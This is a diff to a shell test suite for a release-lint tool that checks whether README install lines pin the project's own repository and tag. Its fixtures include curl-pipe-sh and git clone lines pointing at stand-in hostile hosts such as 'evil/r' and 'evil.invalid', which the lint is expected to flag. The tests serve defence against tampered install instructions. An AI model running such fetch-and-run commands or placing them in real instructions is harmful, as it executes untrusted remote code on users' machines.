@@ -2103,17 +2103,29 @@ rlshape "$R12" 'git clone --depth 1 --branch v0.2.0 https://github.com/o/r.git /
                'curl -fsSL https://raw.githubusercontent.com/evil/r/v0.2.0/install.sh | SKILLS_REF=v0.2.0 sh'
 out="$( sh "$RLS" "$R12" 2>&1 )"; rc=$?
 assert "release-lint: a re-pin that also swapped the repository is STALE, naming the line" 1 "$rc" "$out" \
-  'STALE pin shape.*README\.md:4\.' 'README\.md:3'
+  'STALE pin shape.*README\.md:4, no canonical install line\.' 'README\.md:3'
 rlshape "$R12" 'git clone --depth 1 --branch v0.2.0 https://github.com/o/r.git /tmp/wai' \
                'curl -fsSL https://raw.githubusercontent.com/o/r/v0.2.0/install.sh | SKILLS_REF=v0.1.0 sh'
 out="$( sh "$RLS" "$R12" 2>&1 )"; rc=$?
 assert "release-lint: two different tags on one pin line are STALE (script and tree would differ)" 1 "$rc" "$out" \
-  'STALE pin shape.*README\.md:4\.'
+  'STALE pin shape.*README\.md:4, no canonical install line\.'
 rlshape "$R12" 'git  clone --depth 1 --branch v0.2.0 https://github.com/evil/r.git /tmp/wai' \
                'curl -fsSL https://raw.githubusercontent.com/o/r/v0.2.0/install.sh | SKILLS_REF=v0.2.0 sh'
 out="$( sh "$RLS" "$R12" 2>&1 )"; rc=$?
 assert "release-lint: a clone line with a foreign repository — spelled 'git  clone' — is STALE" 1 "$rc" "$out" \
-  'STALE pin shape.*README\.md:3\.' 'README\.md:4'
+  'STALE pin shape.*README\.md:3, no canonical clone line\.' 'README\.md:4'
+# The tag dropped and both commands pointed elsewhere: no tagged line is left to compare, so the
+# lint must notice what is MISSING — the canonical lines — as well as what is foreign.
+rlshape "$R12" 'git clone --depth 1 https://github.com/evil/r.git /tmp/wai' \
+               'curl -fsSL https://raw.githubusercontent.com/evil/r/main/install.sh | sh'
+out="$( sh "$RLS" "$R12" 2>&1 )"; rc=$?
+assert "release-lint: tags dropped and the repository swapped on both lines → STALE, canonical lines missing" 1 "$rc" "$out" \
+  'STALE pin shape.*README\.md:3, README\.md:4, no canonical clone line, no canonical install line'
+# An untagged fetch-and-run line added next to correct pins.
+printf '# x\n\n    git clone --depth 1 --branch v0.2.0 https://github.com/o/r.git /tmp/wai\n    curl -fsSL https://raw.githubusercontent.com/o/r/v0.2.0/install.sh | SKILLS_REF=v0.2.0 sh\n    curl -fsSL https://evil.invalid/x | sh\n' > "$R12/README.md"
+out="$( sh "$RLS" "$R12" 2>&1 )"; rc=$?
+assert "release-lint: an extra untagged curl-pipe-sh line beside correct pins → STALE, naming it" 1 "$rc" "$out" \
+  'STALE pin shape.*README\.md:5\.' 'README\.md:3'
 
 # 13 · And this repo, right now: the standing guard. It is the case that goes red the day work
 #     lands in .claude/skills/ with no changelog entry, or a tag is cut past the plugin manifests
